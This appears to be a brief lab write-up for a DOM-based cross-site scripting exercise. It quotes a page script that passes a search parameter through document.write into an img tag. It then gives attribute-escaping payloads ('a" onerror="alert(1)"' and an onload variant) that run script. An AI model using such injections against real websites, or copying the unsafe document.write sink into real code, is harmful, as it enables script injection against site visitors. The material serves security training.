Lab description says search functionality is vulnerable. Searching something (`asd`) then looking at the page source 

```javascript
<script>
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}

var query = (new URLSearchParams(window.location.search)).get('search');

if(query) {
    trackSearch(query);
}
</script>


<img src="/resources/images/tracker.gif?searchTerms= esmkw9dh4="">
```

We can see `document.write` function just appends our string to an HTML tag attribute.

To escape out of `img` tag we can give the following string to search bar

```
a" onerror="alert(1)"
```

It will execute alert function but lab won't be solved. Trying every `on*` attribute I found that it wants `onload` attribute.


```
a" onload="alert(1)"
```
